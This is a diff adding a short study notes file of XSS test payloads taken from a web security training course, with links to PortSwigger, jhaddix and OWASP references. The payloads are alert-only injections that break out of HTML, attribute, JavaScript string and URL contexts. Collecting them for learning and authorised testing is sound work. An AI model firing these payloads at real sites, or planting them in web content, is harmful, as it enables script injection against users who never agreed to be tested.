@@ -1,0 +1,33 @@
+-- From Portswigger.net
+
+--Cheat sheet with multiple examples of events and scripts
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+
+--Examples from the XSS academy course
+<script>alert(1)</script>
+<img src=1 onerror=alert(1)>
+</script><img src=1 onerror=alert(document.domain)>
+javascript:alert(1)
+"onmouseover="alert(1)
+" autofocus onfocus=alert(document.domain) x="
+"><script>alert(document.domain)</script>
+</script><script>alert(1)</script>
+'-alert(document.domain)-'
+';alert(document.domain)//
+\';alert(document.domain)//
+${alert(document.domain)}
+comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E
+document.write('... <script>alert(document.domain)</script> ...');
+?returnUrl=javascript:alert(document.domain)
+
+
+
+
+-- jhaddix image of all xss routes
+https://raw.githubusercontent.com/jhaddix/XSS.png/master/XSS2.png
+
+
+
+
+--From OWASP
+https://www.owasp.org/index.php/Testing_for_Cross_site_scripting
